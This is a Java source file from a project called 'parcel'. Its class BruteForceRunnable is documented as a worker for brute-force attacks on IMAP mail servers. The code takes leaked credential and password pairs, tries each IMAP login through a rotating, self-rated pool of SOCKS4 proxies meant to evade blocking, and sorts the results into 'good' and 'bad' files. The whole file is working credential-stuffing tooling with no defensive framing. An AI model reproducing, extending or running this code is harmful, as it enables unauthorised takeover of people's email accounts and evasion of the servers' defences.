package org.bsoftware.parcel.domain.runnables;

import com.chilkatsoft.CkImap;
import lombok.RequiredArgsConstructor;
import lombok.SneakyThrows;
import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
import org.bsoftware.parcel.domain.components.DataContainer;
import org.bsoftware.parcel.domain.model.Connection;
import org.bsoftware.parcel.domain.model.LogLevel;
import org.bsoftware.parcel.domain.model.Proxy;
import org.bsoftware.parcel.domain.model.ProxyRatingAdjustmentType;
import org.bsoftware.parcel.domain.model.Source;
import org.bsoftware.parcel.utilities.ConnectionUtility;
import org.bsoftware.parcel.utilities.FileSystemUtility;

import java.io.IOException;

/**
 * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
 *
 * @author Rudolf Barbu
 * @version 1.0.7
 */
@RequiredArgsConstructor
public class BruteForceRunnable implements Runnable
{
    /**
     * Defines connection timeout
     */
    private static final byte CONNECTION_TIMEOUT = 5;

    /**
     * Defines Socks version
     */
    private static final byte SOCKS_VERSION = 4;

    /**
     * Callback interface, which is used to deliver messages to service
     */
    private final BruteForceCallback bruteForceCallback;

    /**
     * Main method of brute-force algorithm
     */
    @Override
    @SneakyThrows
    public void run()
    {
        final CkImap ckImap = new CkImap();

        ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
        ckImap.put_SocksVersion(SOCKS_VERSION);

        try
        {
            Source source;
            while (((source = DataContainer.getNextSource()) != null) && !Thread.currentThread().isInterrupted())
            {
                final Connection connection = ConnectionUtility.getConnection(source.getCredential());

                ckImap.put_Port(connection.getPort());
                ckImap.put_Ssl(connection.isSsl());
                ckImap.put_StartTls(connection.isTls());

                connectToServer(ckImap, connection.getHost());

                if (!ckImap.connectedToHost().isEmpty())
                {
                    FileSystemUtility.saveSourceToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? "good" : "bad", source);
                    bruteForceCallback.handleDecrementSourcesCounter();
                    ckImap.Disconnect();
                }
            }
        }
        catch (final IOException ioException)
        {
            bruteForceCallback.handleBruteForceMessage(LogLevel.ERROR, String.format("Exception occurred, while saving source to file, message: %s", ioException.getMessage()));
        }

        bruteForceCallback.handleThreadInterruption();
    }

    /**
     * Tries to connect to IMAP server, using proxy
     *
     * @param ckImap IMAP to probe connection
     * @param host particular IMAP server to connect
     */
    private void connectToServer(final CkImap ckImap, final String host)
    {
        final String ipAddress = ckImap.socksHostname();
        final int port = ckImap.get_SocksPort();

        if (!ipAddress.isEmpty() && (port != 0))
        {
            if (!Thread.currentThread().isInterrupted() && ckImap.Connect(host))
            {
                DataContainer.adjustProxyRating(new Proxy(ipAddress, port), ProxyRatingAdjustmentType.INCREASE);
                return;
            }

            DataContainer.adjustProxyRating(new Proxy(ipAddress, port), ProxyRatingAdjustmentType.DECREASE);
        }

        while (!Thread.currentThread().isInterrupted())
        {
            final Proxy proxy = DataContainer.getConvectionProxy();

            ckImap.put_SocksHostname(proxy.getIpAddress());
            ckImap.put_SocksPort(proxy.getPort());

            if (ckImap.Connect(host))
            {
                DataContainer.adjustProxyRating(proxy, ProxyRatingAdjustmentType.INCREASE);
                return;
            }

            DataContainer.adjustProxyRating(proxy, ProxyRatingAdjustmentType.DECREASE);
        }
    }
}